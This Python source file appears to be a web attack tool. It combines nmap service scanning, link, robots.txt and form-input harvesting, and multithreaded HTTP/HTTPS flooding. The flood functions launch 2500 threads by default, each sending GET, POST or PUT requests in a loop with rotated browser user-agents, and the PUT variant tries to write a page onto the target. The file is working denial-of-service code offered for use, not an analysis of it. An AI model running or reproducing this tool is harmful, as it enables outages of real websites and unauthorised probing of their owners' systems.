import socket, threading, time, random, ssl, nmap, re, requests # queue
from bs4 import BeautifulSoup

def logo():
    logo = '''\033[91m
████████╗██╗░░██╗███████╗  ███╗░░██╗███████╗░██╗░░░░░░░██╗
╚══██╔══╝██║░░██║██╔════╝  ████╗░██║██╔════╝░██║░░██╗░░██║
░░░██║░░░███████║█████╗░░  ██╔██╗██║█████╗░░░╚██╗████╗██╔╝
░░░██║░░░██╔══██║██╔══╝░░  ██║╚████║██╔══╝░░░░████╔═████║░
░░░██║░░░██║░░██║███████╗  ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░
        ██████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗
        ██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝
        ██████╔╝██║░░░░░███████║██╔██╗██║█████╗░░
        ██╔═══╝░██║░░░░░██╔══██║██║╚████║██╔══╝░░
        ██║░░░░░███████╗██║░░██║██║░╚███║███████╗
         \033[0m'''
         
    return logo

def scan(input_value, settings):
    yield f"""Scanning '<font color="red">{input_value}</font>'...<br>"""
    port = '' if settings['port'] == None else str(settings['port'])
    domain = input_value
    ip = socket.gethostbyname(domain) if re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', domain) == [] else domain
    scan = nmap.PortScanner().scan(ip, arguments='-sV -T5')['scan'].get(ip, {}).get('tcp', {})

    if scan.get(443, None) != None:
        url = f'https://{domain}/' if port == '' else f'https://{domain}:{port}/'
    else:
        url = f'http://{domain}/' if port == '' else f'http://{domain}:{port}/'

    req = requests.get(url)
    html = req.text
    beauti = BeautifulSoup(html, 'html.parser')
    req_robot = requests.get(url + 'robots.txt')
    html_robot = req_robot.text

    if stop_flag.is_set():
        yield "<br>Scan was stopped.<br>"
        return
    
    def show_info():
        yield '<hr>' + f"""<br>Website Information: <br><br>               IP: {ip} <br>               Domain: {domain} <br>               URL: {url} <br><br>""" + '<hr>'
    
    def link_scan():
        if re.findall(r'href=[\'"]?(http[^\'" #>]+)', html) != [] and req.status_code == 200:
            search_links = re.findall(r'href=[\'"]?(http[^\'" #>]+)', html)
            filtered_links = [link for link in search_links if link != url]
            
            yield "Links found: <br>"
            for num, link in enumerate(filtered_links, start=1):
                yield f"  {num}. {link}<br>"
                
            yield '<hr>'
        
        if set(re.findall(r'/.+', html_robot)) != [] and req_robot.status_code == 200:
            search_links_robots = set(re.findall(r'/.+', html_robot))
            filtered_links_robots = [link for link in search_links_robots if domain not in link]
            
            yield "Links found in '/robots.txt': <br>"
            for num, link in enumerate(filtered_links_robots, start=1):
                yield f"  {num}. {url[:-1]+link}<br>"
        
            yield '<hr>'
    
    def port_scan():
        if scan != {}:
            yield "Ports scanned: <br>"
            for ports, data in scan.items():
                for key, value in data.items():
                    if value == '':
                        data[key] = 'Not Found'

                yield (f"  Port {ports}: <br>"
                       f"    State: {data['state']} | Service: {data['name']} | Product: {data['product']} | Version: {data['version']}<br>")
            yield '<hr>'
    
    def input_scan():
        if beauti.find_all('input') != []:
            yield "Inputs found: <br>"
                        
            for num, input in enumerate(beauti.find_all('input'), start=1):
                yield (f"  {num}. Name: {input.get('name', 'None')}  |  ID: {input.get('id', 'None')}<br>"
                       f"  |  Type: {input.get('type', 'None')}  |  Value: {input.get('value', 'None')}<br>")
            
            yield '<hr>'
            
    for text_show in show_info():
            yield text_show
    
    for text_link in link_scan():
            yield text_link
    
    for text_port in port_scan():
            yield text_port
    
    for text_input in input_scan():
            yield text_input

def request(ip, method):
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0", 
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
                   "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.961.47 Safari/537.36 Edg/93.0.961.47",
                   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"]
    
    random_user = random.choice(user_agents)
    
    if method == "GET":
        return f"GET / HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random_user}\r\n\r\n "
    elif method == "POST":
        return f"POST / HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random_user}\r\n\r\n "
    else:
        return f"PUT /new.html HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random_user}\r\nContent-type: text/html\r\nContent-length: 102400\r\n\r\n <p>New</p>"

def http(ip, settings):
    port = 80 if settings['port'] == None else settings['port']
    nthr = 2500 if settings['threads'] == None else settings['threads']
    
    # for look the result of web data received
    # message_queue = queue.Queue()
    
    def maketheattack():
        req = request(ip, settings['method'])
        while not stop_flag.is_set():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(req.encode('utf-8'))
            s.recv(1024) # Comment this line if you wanna use the queue option
            # message_queue.put('Result: ' + s.recv(1024).decode('utf-8').split(' ')[1])
            s.close()
            time.sleep(random.randint(0, 5))
    
    yield f'Starting the attack on: <font color="red">{ip}</font> | Port: {port}...<br>Number of threads attacking: {nthr}<br>'
    
    threads = []  
    for _ in range(nthr):
        thr = threading.Thread(target=maketheattack)
        thr.start()
        threads.append(thr)
    
    #while any(thr.is_alive() for thr in threads) or not message_queue.empty():
    #    while not message_queue.empty():
    #        yield f"{message_queue.get()}"
    
    for thr in threads:
        thr.join()

    yield f'<br>The attack was stopped'

def https(ip, settings):
    port = 443 if settings['port'] == None else settings['port']
    nthr = 2500 if settings['threads'] == None else settings['threads']
    
    # for look the result of web data received
    #message_queue = queue.Queue()
    
    def maketheattack():
        req = request(ip, settings['method'])
        while not stop_flag.is_set():                
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.verify_mode = ssl.CERT_REQUIRED
            context.check_hostname = True
            context.load_default_certs()
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ss = context.wrap_socket(s, server_hostname=ip)
            ss.connect((ip, port))
            ss.send(req.encode('utf-8'))
            ss.recv(1024) # Comment this line if you wanna use the queue option
            # message_queue.put("Result: " + (ss.recv(1024).decode('utf-8')).split(' ')[1])
            ss.close()
            time.sleep(random.randint(0, 5))
        
    yield f'Starting the attack on: <font color="red">{ip}</font> | Port: {port}...<br>Number of threads attacking: {nthr}<br>'
    
    threads = []  
    for _ in range(nthr):
        thr = threading.Thread(target=maketheattack)
        thr.start()
        threads.append(thr)
    
    #while any(thr.is_alive() for thr in threads) or not message_queue.empty():
    #    while not message_queue.empty():
    #        yield f"{message_queue.get()}"
    
    for thr in threads:
        thr.join()

    yield f'<br>The attack was stopped'

def stopcreate():
    global stop_flag
    stop_flag = threading.Event()
    stop_flag.clear()

def stopcode():
    global stop_flag
    stop_flag.set()
    
    return 'The code will stop...'

def main(input_value, settings):
    
    if settings['scan']:
        for text_scan in scan(input_value, settings):
            yield text_scan
        
    elif settings['attackhttp']:
        
        if settings['method'] == "GET" or settings['method'] == "POST" or settings['method'] == "PUT":
            for text_http in http(input_value, settings):
                yield text_http
        else:
            yield '<p>You need choose a method: <font color="red">GET, POST or PUT!</font></p>'

    elif settings['attackhttps']:
        
        if settings['method'] == "GET" or settings['method'] == "POST" or settings['method'] == "PUT":
            for text_https in https(input_value, settings):
                yield text_https
        else:
            yield '<p>You need choose a method: <font color="red">GET, POST or PUT!</font></p>'

    yield "<stop></stop>"
